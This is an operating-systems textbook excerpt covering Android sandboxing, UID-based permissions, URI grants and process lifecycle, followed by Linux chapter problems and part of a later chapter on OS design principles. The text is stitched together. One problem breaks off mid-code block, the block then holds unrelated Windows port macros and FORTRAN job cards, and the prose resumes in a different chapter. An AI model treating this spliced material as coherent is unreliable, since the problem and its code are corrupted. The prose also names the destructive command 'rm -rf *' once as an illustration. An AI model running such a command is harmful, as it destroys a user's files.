If the intent resolves to multiple possible activities, we cannot just launch all of them; we need to pick a single one to be launched. This is accomplished through a trick in the package manager. If the package manager is asked to resolve an intent down to a single activity, but it finds there are multiple matches, it instead resolves the intent to a special activity built into the system called the ResolverActivity. This activity, when launched, simply takes the original intent, asks the package manager for a list of all matching activities, and displays these for the user to select a single desired action. When one is selected, it creates a new explicit intent from the original intent and the selected activity, calling the system to have that new activity started.

Android has another similarity with the Linux shell: Android's graphical shell, the launcher, runs in user space like any other application. An Android launcher performs calls on the package manager to find the available activities and launch them when selected by the user.

### 10.8.10 Application Sandboxes

Traditionally in operating systems, applications are seen as code executing as the user, on the user's behalf. This behavior has been inherited from the command line, where you run the Is command and expect that to run as your identity (UID), with the same access rights as you have on the system. In the same way, when you use a graphical user interface to launch a game you want to play, that game will effectively run as your identity, with access to your files and many other things it may not actually need.

This is not, however, how we mostly use computers today. We run applications we acquired from some less trusted third-party source, that have sweeping functionality, which will do a wide variety of things in their environment that we have little control over. There is a disconnect between the application model supported by the operating system and the one actually in use. This may be mitigated by strategies such as distinguishing between normal and "admin" user privileges and warning the first time they are running an application, but those do not really address the underlying disconnect.

In other words, traditional operating systems are very good at protecting users from other users, but not in protecting users from themselves. All programs run with the power of the user and, if any of them misbehaves, it can do all the damage the user can do. Think about it: how much damage could you do in, say, a UNIX environment? You could leak all information accessible to the user. You could perform rm -rf * to give yourself a nice, empty home directory. And if the program is not just buggy, but also malicious, it could encrypt all your files for ransom. Running everything with "the power of you" is dangerous!

Android attempts to address this with a core premise: that an application is actually the developer of that application running as a guest on the user's device. Thus an application is not trusted with anything sensitive that is not explicitly approved by the user.

In Android's implementation, this philosophy is rather directly expressed through user IDs. When an Android application is installed, a new unique Linux user ID (or UID) is created for it, and all of its code runs as that "user." Linux user IDs thus create a sandbox for each application, with their own isolated area of the file system, just as they create sandboxes for users on a desktop system. In other words, Android uses an existing feature in Linux, but in a novel way. The result is better isolation.

### 10.8.11 Security

Application security in Android revolves around UIDs. In Linux, each process runs as a specific UID, and Android uses the UID to identify and protect security barriers. The only way to interact across processes is through some IPC mechanism, which generally carries with it enough information to identify the UID of the
caller. Binder IPC explicitly includes this information in every transaction delivered across processes so a recipient of the IPC can easily ask for the UID of the caller.

Android predefines a number of standard UIDs for the lower-level parts of the system, but most applications are dynamically assigned a UID, at first boot or install time, from a range of "application UIDs." Figure 10-62 illustrates some common mappings of UID values to their meanings. UIDs below 10000 are fixed assignments within the system for dedicated hardware or other specific parts of the implementation; some typical values in this range are shown here. In the range 10000-19999 are UIDs dynamically assigned to applications by the package manager when it installs them; this means at most 10,000 applications can be installed on the system. Also note the range starting at 100000, which is used to implement a traditional multiuser model for Android: an application that is granted UID 10002 as its identity would be identified as 110002 when running as a second user.

| UID | Purpose |
| :--- | :--- |
| 0 | Root |
| 1000 | Core system (system_server process) |
| 1001 | Telephony services |
| 1013 | Low-level media processes |
| 2000 | Command line shell access |
| 10000-19999 | Dynamically assigned application UIDs |
| 100000 | Start of secondary users |

Figure 10-62. Common UID assignments in Android

When an application is first assigned a UID, a new storage directory is created for it, with the files there owned by its UID. The application gets free access to its private files there, but cannot access the files of other applications, nor can the other applications touch its own files. This makes content providers, as discussed in the earlier section on applications, especially important, as they are one of the few mechanisms that can transfer data between applications.

Even the system itself, running as UID 1000, cannot touch the files of applications. This is why the installd daemon exists: it runs with special privileges to be able to access and create files and directories for other applications. There is a very restricted API installd provides to the package manager for it to create and manage the data directories of applications as needed.

In their base state, Android's application sandboxes must disallow any cross-application interactions that can violate security between them. This may be for robustness (preventing one app from crashing another app), but most often it is about information access.

Consider our camera application. When the user takes a picture, the camera application stores that picture in its private data space. No other applications can
access that data, which is what we want since the pictures there may be sensitive data to the user.

After the user has taken a picture, she may want to email it to a friend. Email is a separate application, in its own sandbox, with no access to the pictures in the camera application. How can the email application get access to the pictures in the camera application's sandbox?

The best-known form of access control in Android is application permissions. Permissions are specific well-defined abilities that can be granted to an application at install time. The application lists the permissions it needs in its manifest, and prior to installing the application the user is informed of what it will be allowed to do based on them.

Figure 10-63 shows how our email application could make use of permissions to access pictures in the camera application. In this case, the camera application has associated the READ_PICTURES permission with its pictures, saying that any application holding that permission can access its picture data. The email application declares in its manifest that it requires this permission. The email application can now access a URI owned by the camera, such as content://pics/1; upon receiving the request for this URI, the camera app's content provider asks the package manager whether the caller holds the necessary permission. If it does, the call succeeds and appropriate data is returned to the application.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-301_708_1109_1123_216.jpg)
Figure 10-63. Requesting and using a permission.

Permissions are not tied to content providers; any IPC into the system may be protected by a permission through the system's asking the package manager if the caller holds the required permission. Recall that application sandboxing is based
on processes and UIDs, so a security barrier always happens at a process boundary, and permissions themselves are associated with UIDs. Given this, a permission check can be performed by retrieving the UID associated with the incoming IPC and asking the package manager whether that UID has been granted the corresponding permission. For example, permissions for accessing the user's location are enforced by the system's location manager service when applications call in to it.

Figure 10-64 illustrates what happens when an application does not hold a permission needed for an operation it is performing. Here the browser application is trying to directly access the user's pictures, but the only permission it holds is one for network operations over the Internet. In this case the PicturesProvider is told by the package manager that the calling process does not hold the needed READ_PICTURES permission, and as a result throws a SecurityException back to it.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-302_706_1107_818_215.jpg)
Figure 10-64. Accessing data without a permission.

Permissions provide broad, unrestricted access to classes of operations and data. They work well when an application's functionality is centered around those operations, such as our email application requiring the INTERNET permission to send and receive email. However, does it make sense for the email application to hold a READ_PICTURES permission? There is nothing about an email application that is directly related to reading your pictures, and no reason for an email application to have access to all of your pictures.

There is another issue with this use of permissions, which we can see by returning to Fig. 10-55. Recall how we can launch the email application's ComposeActivity to share a picture from the camera application. The email application
receives a URI of the data to share, but does not know where it came from-in the figure here it comes from the camera, but any other application could use this to let the user email its data, from audio files to word-processing documents. The email application only needs to read that URI as a byte stream to add it as an attachment. However, with permissions it would also have to specify up-front the permissions for all of the data of all of the applications it may be asked to send an email from.

We have two problems to solve. First, we do not want to give applications access to wide swaths of data that they do not really need. Second, they need to be given access to any data sources, even ones they do not have a priori knowledge about.

There is an important observation to make: the act of emailing a picture is actually a user interaction where the user has expressed a clear intent to use a specific picture with a specific application. As long as the operating system is involved in the interaction, it can use this to identify a specific hole to open in the sandboxes between the two applications, allowing that data through.

Android supports this kind of implicit secure data access through intents and content providers. Figure 10-65 illustrates how this situation works for our picture emailing example. The camera application at the bottom-left has created an intent asking to share one of its images, content://pics/1. In addition to starting the email compose application as we had seen before, this also adds an entry to a list of "granted URIs," noting that the new ComposeActivity now has access to this URI. Now when ComposeActivity looks to open and read the data from the URI it has been given, the camera application's PicturesProvider that owns the data behind the URI can ask the activity manager if the calling email application has access to the data, which it does, so the picture is returned.

This fine-grained URI access control can also operate the other way. There is another intent action, android.intent.action.GET_CONTENT, which an application can use to ask the user to pick some data and return to it. This would be used in our email application, for example, to operate the other way around: the user while in the email application can ask to add an attachment, which will launch an activity in the camera application for them to select one.

Figure 10-66 illustrates this new flow. It is almost identical to Fig. 10-65, the only difference being in the way the activities of the two applications are composed, with the email application starting the appropriate picture-selection activity in the camera application. Once an image is selected, its URI is returned back to the email application, and at this point our URI grant is recorded by the activity manager.

This approach is extremely powerful, since it allows the system to maintain tight control over per-application data, granting specific access to data where needed, without the user needing to be aware that this is happening. Many other user interactions can also benefit from it. An obvious one is drag and drop to create a similar URI grant, but Android also takes advantage of other information such as current window focus to determine the kinds of interactions applications can have.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-304_809_1110_249_213.jpg)
Figure 10-65. Sharing a picture using a content provider.

A final common security method Android uses is explicit user interfaces for allowing/removing specific types of access. In this approach, there is some way an application indicates it can optionally provide some functionally, and a system-supplied trusted user interface that provides control over this access.

A typical example of this approach is Android's input-method architecture. An input method is a specific service supplied by a third-party application that allows the user to provide input to applications, typically in the form of an on-screen keyboard. This is a highly sensitive interaction in the system, since a lot of personal data will go through the input-method application, including passwords the user types.

An application indicates it can be an input method by declaring a service in its manifest with an intent filter matching the action for the system's input-method protocol. This does not, however, automatically allow it to become an input method, and unless something else happens the application's sandbox has no ability to operate like one.

Android's system settings include a user interface for selecting input methods. This interface shows all available input methods of the currently installed applications and whether or not they are enabled. If the user wants to use a new input method after they have installed its application, they must go to this system settings interface and enable it. When doing that, the system can also inform the user of the kinds of things this will allow the application to do.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-305_800_1111_246_213.jpg)
Figure 10-66. Adding a picture attachment using a content provider.

Even once an application is enabled as an input method, Android uses finegrained access-control techniques to limit its impact. For example, only the application that is being used as the current input method can actually have any special interaction; if the user has enabled multiple input methods (such as a soft keyboard and voice input), only the one that is currently in active use will have those features available in its sandbox. Even the current input method is restricted in what it can do, through additional policies such as only allowing it to interact with the window that currently has input focus.

### 10.8.12 Process Model

The traditional process model in Linux is a fork to create a new process, followed by an exec to initialize that process with the code to be run and then start its execution. The shell is responsible for driving this execution, forking and executing processes as needed to run shell commands. When those commands exit, the process is removed by Linux.

Android uses processes somewhat differently. As discussed in the previous section on applications, the activity manager is the part of Android responsible for managing running applications. It coordinates the launching of new application processes, determines what will run in them, and when they are no longer needed.

## Starting Processes

In order to launch new processes, the activity manager must communicate with the zygote. When the activity manager first starts, it creates a dedicated socket with zygote, through which it sends a command when it needs to start a process. The command primarily describes the sandbox to be created: the UID that the new process should run as and any other security restrictions that will apply to it. Zygote thus must run as root: when it forks, it does the appropriate setup for the UID it will run as, finally dropping root privileges and changing the process to the desired UID.

Recall in our previous discussion about Android applications that the activity manager maintains dynamic information about the execution of activities (in Fig. 10-52), services (Fig. 10-57), broadcasts (to receivers as in Fig. 10-60), and content providers (Fig. 10-61). It uses this information to drive the creation and management of application processes. For example, when the application launcher calls in to the system with a new intent to start an activity as we saw in Fig. 10-52, it is the activity manager that is responsible for making that new application run.

The flow for starting an activity in a new process is shown in Fig. 10-67. The details of each step in the illustration are:

1. Some existing process (such as the app launcher) calls in to the activity manager with an intent describing the new activity it would like to have started.
2. Activity manager asks the package manager to resolve the intent to an explicit component.
3. Activity manager determines that the application's process is not already running, and then asks zygote for a new process of the appropriate UID.
4. Zygote performs a fork, creating a new process that is a clone of itself, drops privileges and sets its UID appropriately for the application's sandbox, and finishes initialization of Dalvik in that process so that the Java runtime is fully executing. For example, it must start threads like the garbage collector after it forks.
5. The new process, now a clone of zygote with the Java environment fully up and running, calls back to the activity manager, asking "What am I supposed to do?"
6. Activity manager returns back the full information about the application it is starting, such as where to find its code.
7. New process loads the code for the application being run.

8. Activity manager sends to the new process any pending operations, in this case "start activity X."
9. New process receives the command to start an activity, instantiates the appropriate Java class, and executes it.

![](./images/8fcc30e4-d6c3-442e-a7e2-8b8316a28e5b-307_857_1248_464_148.jpg)
Figure 10-67. Steps in launching a new application process.

Note that when we started this activity, the application's process may already have been running. In that case, the activity manager will simply skip to the end, sending a new command to the process telling it to instantiate and run the appropriate component. This can result in an additional activity instance running in the application, if appropriate, as we saw previously in Fig. 10-56.

## Process Lifecycle

The activity manager is also responsible for determining when processes are no longer needed. It keeps track of all activities, receivers, services, and content providers running in a process; from this it can determine how important (or not) the process is.

Recall that Android's out-of-memory killer in the kernel uses a process's oom_adj as a strict ordering to determine which processes it should kill first. The activity manager is responsible for setting each process's oom_adj appropriately
based on the state of that process, by classifying them into major categories of use. Figure 10-68 shows the main categories, with the most important category first. The last column shows a typical oom_adj value that is assigned to processes of this type.

| Category | Description | oom_adj |
| :--- | :--- | :--- |
| SYSTEM | The system and daemon processes | -16 |
| PERSISTENT | Always-running application processes | -12 |
| FOREGROUND | Currently interacting with user | 0 |
| VISIBLE | Visible to user | 1 |
| PERCEPTIBLE | Something the user is aware of | 2 |
| SERVICE | Running background services | 3 |
| HOME | The home/launcher process | 4 |
| CACHED | Processes not in use | 5 |

Figure 10-68. Process importance categories.

Now, when RAM is getting low, the system has configured the processes so that the out-of-memory killer will first kill cached processes to try to reclaim enough needed RAM, followed by home, service, and on up. Within a specific oom_adj level, it will kill processes with a larger RAM footprint before smaller ones.

We've now seen how Android decides when to start processes and how it categorizes those processes in importance. Now we need to decide when to have processes exit, right? Or do we really need to do anything more here? The answer is, we do not. On Android, application processes never cleanly exit. The system just leaves unneeded processes around, relying on the kernel to reap them as needed.

Cached processes in many ways take the place of the swap space that Android lacks. As RAM is needed elsewhere, cached processes can be thrown out of active RAM. If an application later needs to run again, a new process can be created, restoring any previous state needed to return it to how the user last left it. Behind the scenes, the operating system is launching, killing, and relaunching processes as needed so the important foreground operations remain running and cached processes are kept around as long as their RAM would not be better used elsewhere.

## Process Dependencies

We at this point have a good overview of how individual Android processes are managed. There is a further complication to this, however: dependencies between processes.

As an example, consider our previous camera application holding the pictures that have been taken. These pictures are not part of the operating system; they are
implemented by a content provider in the camera application. Other applications may want to access that picture data, becoming a client of the camera application.

Dependencies between processes can happen with both content providers (through simple access to the provider) and services (by binding to a service). In either case, the operating system must keep track of these dependencies and manage the processes appropriately.

Process dependencies impact two key things: when processes will be created (and the components created inside of them), and what the oom_adj importance of the process will be. Recall that the importance of a process is that of the most important component in it. Its importance is also that of the most important process that is dependent on it.

For example, in the case of the camera application, its process and thus its content provider is not normally running. It will be created when some other process needs to access that content provider. While the camera's content provider is being accessed, the camera process will be considered at least as important as the process that is using it.

To compute the final importance of every process, the system needs to maintain a dependency graph between those processes. Each process has a list of all services and content providers currently running in it. Each service and content provider itself has a list of each process using it. (These lists are maintained in records inside the activity manager, so it is not possible for applications to lie about them.) Walking the dependency graph for a process involves walking through all of its content providers and services and the processes using them.

Figure 10-69 illustrates a typical state processes can be in, taking into account dependencies between them. This example contains two dependencies, based on using a camera-content provider to add a picture attachment to an email as discussed in Fig. 10-66. First is the current foreground email application, which is making use of the camera application to load an attachment. This raises the camera process up to the same importance as the email app. Second is a similar situation, the music application is playing music in the background with a service, and while doing so has a dependency on the media process for accessing the user's music media.

Consider what happens if the state of Fig. 10-69 changes so that the email application is done loading the attachment, and no longer uses the camera content provider. Figure 10-70 illustrates how the process state will change. Note that the camera application is no longer needed, so it has dropped out of the foreground importance, and down to the cached level. Making the camera cached has also pushed the old maps application one step down in the cached LRU list.

These two examples give a final illustration of the importance of cached processes. If the email application again needs to use the camera provider, the provider's process will typically already be left as a cached process. Using it again is then just a matter of setting the process back to the foreground and reconnecting with the content provider that is already sitting there with its database initialized.

| Process | State | Importance |
| :--- | :--- | :--- |
| system | Core part of operating system | SYSTEM |
| phone | Always running for telephony stack | PERSISTENT |
| email | Current foreground application | FOREGROUND |
| camera | In use by email to load attachment | FOREGROUND |
| music | Running background service playing music | PERCEPTIBLE |
| media | In use by music app for accessing user's music | PERCEPTIBLE |
| download | Downloading a file for the user | SERVICE |
| launcher | App launcher not current in use | HOME |
| maps | Previously used mapping application | CACHED |

Figure 10-69. Typical state of process importance

| Process | State | Importance |
| :--- | :--- | :--- |
| system | Core part of operating system | SYSTEM |
| phone | Always running for telephony stack | PERSISTENT |
| email | Current foreground application | FOREGROUND |
| music | Running background service playing music | PERCEPTIBLE |
| media | In-use by music app for accessing user's music | PERCEPTIBLE |
| download | Downloading a file for the user | SERVICE |
| launcher | App launcher not current in use | HOME |
| camera | Previously used by email | CACHED |
| maps | Previously used mapping application | CACHED+1 |

Figure 10-70. Process state after email stops using camera

### 10.9 SUMMARY

Linux began its life as an open-source, full-production UNIX clone, and is now used on machines ranging from smartphones and notebook computers to supercomputers. Three main interfaces to it exist: the shell, the C library, and the system calls themselves. In addition, a graphical user interface is often used to simplify user interaction with the system. The shell allows users to type commands for execution. These may be simple commands, pipelines, or more complex structures. Input and output may be redirected. The C library contains the system calls and also many enhanced calls, such as printf for writing formatted output to files. The actual system call interface is architecture dependent, and on x86 platforms consists of roughly 250 calls, each of which does what is needed and no more.

The key concepts in Linux include the process, the memory model, I/O, and the file system. Processes may fork off subprocesses, leading to a tree of processes.

Process management in Linux is different compared to other UNIX systems in that Linux views each execution entity-a single-threaded process, or each thread within a multithreaded process or the kernel-as a distinguishable task. A process, or a single task in general, is then represented via two key components, the task structure and the additional information describing the user address space. The former is always in memory, but the latter data can be paged in and out of memory. Process creation is done by duplicating the process task structure, and then setting the memory-image information to point to the parent's memory image. Actual copies of the memory-image pages are created only if sharing is not allowed and a memory modification is required. This mechanism is called copy on write. Scheduling is done using a weighted fair queueing algorithm that uses a red-black tree for the tasks' queue management.

The memory model consists of three segments per process: text, data, and stack. Memory management is done by paging. An in-memory map keeps track of the state of each page, and the page daemon uses a modified dual-hand clock algorithm to keep enough free pages around.

I/O devices are accessed using special files, each having a major device number and a minor device number. Block device I/O uses the main memory to cache disk blocks and reduce the number of disk accesses. Character I/O can be done in raw mode, or character streams can be modified via line disciplines. Networking devices are treated somewhat differently, by associating entire network protocol modules to process the network packets stream to and from the user process.

The file system is hierarchical with files and directories. All disks are mounted into a single directory tree starting at a unique root. Individual files can be linked into a directory from elsewhere in the file system. To use a file, it must be first opened, which yields a file descriptor for use in reading and writing the file. Internally, the file system uses three main tables: the file descriptor table, the open-file-description table, and the i-node table. The i-node table is the most important of these, containing all the administrative information about a file and the location of its blocks. Directories and devices are also represented as files, along with other special files.

Protection is based on controlling read, write, and execute access for the owner, group, and others. For directories, the execute bit means search permission.

Android is a platform for allowing apps to run on mobile devices. It is based on the Linux kernel, but consists of a large body of software on top of Linux, plus a small number of changes to the Linux kernel. Most of Android is written in Java. Apps are also written in Java, then translated to Java bytecode and then to Dalvik bytecode. Android apps communicate by a form of protected message passing called transactions. A special Linux kernel model called the Binder handles the IPC.

Android packages are self contained and have a manifest desccribing what is in the package. Packages contain activities, receivers, content providers, and intents. The Android security model is different from the Linux model and carefully sandboxes each app because all apps are regarded as untrustworthy.

## PROBLEMS

1. Explain how writing UNIX in C made it easier to port it to new machines.
2. The POSIX interface defines a set of library procedures. Explain why POSIX standardizes library procedures instead of the system-call interface.
3. Linux depends on gcc compiler to be ported to new architectures. Describe one advantage and one disadvantage of this dependency.
4. A directory contains the following files:

| aardvark | ferret | koala | porpoise | unicorn |
| :--- | :--- | :--- | :--- | :--- |
| bonefish | grunion | llama | quacker | vicuna |
| capybara | hyena | marmot | rabbit | weasel |
| dingo | ibex | nuthatch | seahorse | yak |
| emu | jellyfish | ostrich | tuna | zebu |

Which files will be listed by the command
```

Is [abc]*e*?

```

5. What does the following Linux shell pipeline do?
```

grep nd xyz | wc -l

```

6. Write a Linux pipeline that prints the eighth line of file $z$ on standard output.
7. Why does Linux distinguish between standard output and standard error, when both default to the terminal?
8. A user at a terminal types the following commands:
```

a | b | c &
d|e|f&

```

After the shell has processed them, how many new processes are running?
9. When the Linux shell starts up a process, it puts copies of its environment variables, such as HOME, on the process' stack, so the process can find out what its home directory is. If this process should later fork, will the child automatically get these variables, too?
10. About how long does it take a traditional UNIX system to fork off a child process under the following conditions: text size $=100 \mathrm{~KB}$, data size $=20 \mathrm{~KB}$, stack size $=10$ KB, task structure $=1 \mathrm{~KB}$, user structure $=5 \mathrm{~KB}$. The kernel trap and return takes 1 msec, and the machine can copy one 32-bit word every 50 nsec. Text segments are shared, but data and stack segments are not.
11. As multimegabyte programs became more common, the time spent executing the fork system call and copying the data and stack segments of the calling process grew proportionally. When fork is executed in Linux, the parent's address space is not copied, as traditional fork semantics would dictate. How does Linux prevent the child from doing something that would completely change the fork semantics?

12. Why are negative arguments to nice reserved exclusively for the superuser?
13. A non-real-time Linux process has priority levels from 100 to 139. What is the default static priority and how is the nice value used to change this?
14. Does it make sense to take away a process' memory when it enters zombie state? Why or why not?
15. To what hardware concept is a signal closely related? Give two examples of how signals are used.
16. Why do you think the designers of Linux made it impossible for a process to send a signal to another process that is not in its process group?
17. A system call is usually implemented using a software interrupt (trap) instruction. Could an ordinary procedure call be used as well on the Pentium hardware? If so, under what conditions and how? If not, why not?
18. In general, do you think daemons have higher or lower priority than interactive processes? Why?
19. When a new process is forked off, it must be assigned a unique integer as its PID. Is it sufficient to have a counter in the kernel that is incremented on each process creation, with the counter used as the new PID? Discuss your answer.
20. In every process' entry in the task structure, the PID of the parent is stored. Why?
21. The copy-on-write mechanism is used as an optimization in the fork system call, so that a copy of a page is created only when one of the processes (parent or child) tries to write on the page. Suppose a process p1 forks processes p2 and p3 in quick succession. Explain how a page sharing may be handled in this case.
22. What combination of the sharing_flags bits used by the Linux clone command corresponds to a conventional UNIX fork call? To creating a conventional UNIX thread?
23. Two tasks A and B need to perform the same amount of work. However, task A has higher priority, and needs to be given more CPU time. Expain how will this be achieved in each of the Linux schedulers described in this chapter, the O(1) and the CFS scheduler.
24. Some UNIX systems are tickless, meaning they do not have periodic clock interrupts. Why is this done? Also, does ticklessness make sense on a computer (such as an embedded system) running only one process?
25. When booting Linux (or most other operating systems for that matter), the bootstrap loader in sector 0 of the disk first loads a boot program which then loads the operating system. Why is this extra step necessary? Surely it would be simpler to have the bootstrap loader in sector 0 just load the operating system directly.
26. A certain editor has 100 KB of program text, 30 KB of initialized data, and 50 KB of BSS. The initial stack is 10 KB. Suppose that three copies of this editor are started simultaneously. How much physical memory is needed (a) if shared text is used, and (b) if it is not?
27. Why are open-file-descriptor tables necessary in Linux?
28. In Linux, the data and stack segments are paged and swapped to a scratch copy kept on a special paging disk or partition, but the text segment uses the executable binary file instead. Why?
29. Describe a way to use mmap and signals to construct an interprocess-communication mechanism.
30. A file is mapped in using the following mmap system call:
```

mmap(65536, 32768, READ, FLAGS, fd, 0)

```

Pages are 8 KB. Which byte in the file is accessed by reading a byte at memory address 72,000?
31. After the system call of the previous problem has been executed, the call
```

munmap(65536, 8192)

uc = READ_PORT_UCHAR(port); WRITE_PORT_UCHAR(port, uc);
us = READ_PORT_USHORT(port); WRITE_PORT_USHORT(port, us);
ul = READ_PORT_ULONG(port); WRITE_PORT_LONG(port, ul);

MOUNT(TAPE08, REEL781)
RUN(INPUT, MYDATA, OUTPUT, PUNCH, TAPE08)

```

The first card instructed the operator to go get tape reel 781 from the tape rack and mount it on tape drive 8. The second card instructed the operating system to run the just-compiled FORTRAN program, mapping INPUT (meaning the card reader) to logical tape 1, disk file MYDATA to logical tape 2, the printer (called OUTPUT) to logical tape 3, the card punch (called PUNCH) to logical tape 4. and physical tape drive 8 to logical tape 5.

FORTRAN had a well-defined syntax for reading and writing logical tapes. By reading from logical tape 1, the program got card input. By writing to logical tape 3, output would later appear on the printer. By reading from logical tape 5, tape reel 781 could be read in, and so on. Note that the tape idea was just a paradigm to integrate the card reader, printer, punch, disk files, and tapes. In this example, only logical tape 5 was a physical tape; the rest were ordinary (spooled) disk files. It was a primitive paradigm, but it was a start in the right direction.

Later came UNIX, which goes much further using the model of "everything is a file." Using this paradigm, all I/O devices are treated as files and can be opened and manipulated as ordinary files. The C statements
```

fd1 = open(“file1”, O_RDWR);
fd2 = open(“/dev/tty”, O_RDWR)’

```

open a true disk file and the user's terminal (keyboard + display). Subsequent statements can use fd1 and fd2 to read and write them, respectively. From that point on, there is no difference between accessing the file and accessing the terminal, except that seeks on the terminal are not allowed.

Not only does UNIX unify files and I/O devices, but it also allows other processes to be accessed over pipes as files. Furthermore, when mapped files are supported, a process can get at its own virtual memory as though it were a file. Finally, in versions of UNIX that support the /proc file system, the C statement
```

fd3 = open(“/proc/501”, O_RDWR);

```

allows the process to (try to) access process 501's memory for reading and writing using file descriptor fd3, something useful for, say, a debugger.

Of course, just because someone says that everything is a file does not mean it is true-for everything. For instance, UNIX network sockets may resemble files somewhat, but they have their own, fairly different, socket API. Another operating
system, Plan 9 from Bell Labs, has not compromised and does not provide specialized interfaces for network sockets and such. As a result, the Plan 9 design is arguably cleaner.

Windows tries to make everything look like an object. Once a process has acquired a valid handle to a file, process, semaphore, mailbox, or other kernel object, it can perform operations on it. This paradigm is even more general than that of UNIX and much more general than that of FORTRAN.

Unifying paradigms occur in other contexts as well. One of them is worth mentioning here: the Web. The paradigm behind the Web is that cyberspace is full of documents, each of which has a URL. By typing in a URL or clicking on an entry backed by a URL, you get the document. In reality, many "documents" are not documents at all, but are generated by a program or shell script when a request comes in. For example, when a user asks an online store for a list of CDs by a particular artist, the document is generated on-the-fly by a program; it certainly did not exist before the query was made.

We have now seen four cases: namely, everything is a tape, file, object, or document. In all four cases, the intention is to unify data, devices, and other resources to make them easier to deal with. Every operating system should have such a unifying data paradigm.

### 12.2.3 The System-Call Interface

If one believes in Corbató's dictum of minimal mechanism, then the operating system should provide as few system calls as it can get away with, and each one should be as simple as possible (but no simpler). A unifying data paradigm can play a major role in helping here. For example, if files, processes, I/O devices, and much more all look like files or objects, then they can all be read with a single read system call. Otherwise it may be necessary to have separate calls for read_file, read_proc, and read_tty, among others.

Sometimes, system calls may need several variants, but it is often good practice to have one call that handles the general case, with different library procedures to hide this fact from the programmers. For example, UNIX has a system call for overlaying a process' virtual address space, exec. The most general call is
```

exec(name, argp, envp);

```

which loads the executable file name and gives it arguments pointed to by argp and environment variables pointed to by envp. Sometimes it is convenient to list the arguments explicitly, so the library contains procedures that are called as follows:
```

execl(name, arg0, arg1, …, argn, 0);
execle(name, arg0, arg1, …, argn, envp);

```

All these procedures do is stick the arguments in an array and then call exec to do the real work. This arrangement is the best of both worlds: a single straightforward
system call keeps the operating system simple, yet the programmer gets the convenience of various ways to call exec.

Of course, trying to have one call to handle every possible case can easily get out of hand. In UNIX creating a process requires two calls: fork followed by exec. The former has no parameters; the latter has three. In contrast, the WinAPI call for creating a process, CreateProcess, has 10 parameters, one of which is a pointer to a structure with an additional 18 parameters.

A long time ago, someone should have asked whether something awful would happen if some of these had been omitted. The truthful answer would have been in some cases programmers might have to do more work to achieve a particular effect, but the net result would have been a simpler, smaller, and more reliable operating system. Of course, the person proposing the $10+18$ parameter version might have added: "But users like all these features." The rejoinder might have been they like systems that use little memory and never crash even more. Trade-offs between more functionality at the cost of more memory are at least visible and can be given a price tag (since the price of memory is known). However, it is hard to estimate the additional crashes per year some feature will add and whether the users would make the same choice if they knew the hidden price. This effect can be summarized in Tanenbaum's first law of software:

## Adding more code adds more bugs.

Adding more features adds more code and thus adds more bugs. Programmers who believe adding new features does not add new bugs either are new to computers or believe the tooth fairy is out there watching over them.

Simplicity is not the only issue that comes out when designing system calls. An important consideration is Lampson's (1984) slogan:

## Don't hide power.

If the hardware has an extremely efficient way of doing something, it should be exposed to the programmers in a simple way and not buried inside some other abstraction. The purpose of abstractions is to hide undesirable properties, not hide desirable ones. For example, suppose the hardware has a special way to move large bitmaps around the screen (i.e., the video RAM) at high speed. It would be justified to have a new system call to get at this mechanism, rather than just provide ways to read video RAM into main memory and write it back again. The new call should just move bits and nothing else. If a system call is fast, users can always build more convenient interfaces on top of it. If it is slow, nobody will use it.

Another design issue is connection-oriented vs. connectionless calls. The Windows and UNIX system calls for reading a file are connection-oriented, like using the telephone. First you open a file, then you read it, finally you close it. Some remote file-access protocols are also connection-oriented. For example, to use FTP, the user first logs in to the remote machine, reads the files, and then logs out.

On the other hand, some remote file-access protocols are connectionless. The Web protocol (HTTP) is connectionless. To read a Web page you just ask for it; there is no advance setup required (a TCP connection is required, but this is at a lower level of protocol. HTTP itself is connectionless).

The trade-off between any connection-oriented mechanism and a connectionless one is the additional work required to set up the mechanism (e.g., open the file), and the gain from not having to do it on (possibly many) subsequent calls. For file I/O on a single machine, where the setup cost is low, probably the standard way (first open, then use) is the best way. For remote file systems, a case can be made both ways.

Another issue relating to the system-call interface is its visibility. The list of POSIX-mandated system calls is easy to find. All UNIX systems support these, as well as a small number of other calls, but the complete list is always public. In contrast, Microsoft has never made the list of Windows system calls public. Instead the WinAPI and other APIs have been made public, but these contain vast numbers of library calls (over 10,000) but only a small number are true system calls. The argument for making all the system calls public is that it lets programmers know what is cheap (functions performed in user space) and what is expensive (kernel calls). The argument for not making them public is that it gives the implementers the flexibility of changing the actual underlying system calls to make them better without breaking user programs. As we saw in Sec. 9.7.7, the original designers simply got it wrong with the access system call, but now we are stuck with it.

### 12.3 IMPLEMENTATION

Turning away from the user and system-call interfaces, let us now look at how to implement an operating system. In the following sections we will examine some general conceptual issues relating to implementation strategies. After that we will look at some low-level techniques that are often helpful.

### 12.3.1 System Structure

Probably the first decision the implementers have to make is what the system structure should be. We examined the main possibilities in Sec. 1.7, but will review them here. An unstructured monolithic design is not a good idea, except maybe for a tiny operating system in, say, a toaster, but even there it is arguable.

## Layered Systems

A reasonable approach that has been well established over the years is a layered system. Dijkstra's THE system (Fig. 1-25) was the first layered operating system. UNIX and Windows 8 also have a layered structure, but the layering in both
of them is more a way of trying to describe the system than a real guiding principle that was used in building the system.

For a new system, designers choosing to go this route should first very carefully choose the layers and define the functionality of each one. The bottom layer should always try to hide the worst idiosyncracies of the hardware, as the HAL does in Fig. 11-4. Probably the next layer should handle interrupts, context switching, and the MMU, so above this level the code is mostly machine independent. Above this, different designers will have different tastes (and biases). One possibility is to have layer 3 manage threads, including scheduling and interthread synchronization, as shown in Fig. 12-2. The idea here is that starting at layer 4 we have proper threads that are scheduled normally and synchronize using a standard mechanism (e.g., mutexes).

| Layer |  |  |  |  |  |
| :--- | :--- | :--- | :--- | :--- | :--- |
| 7 | System call handler |  |  |  |  |
| 6 | File system 1 |  | ⋯ |  | File system m |
| 5 | Virtual memory |  |  |  |  |
| 4 | Driver 1 | Driver 2 | ⋯ |  | Driver n |
| 3 | Threads, thread scheduling, thread synchronization |  |  |  |  |
| 2 | Interrupt handling, context switching, MMU |  |  |  |  |
| 1 | Hide the low-level hardware |  |  |  |  |

Figure 12-2. One possible design for a modern layered operating system.

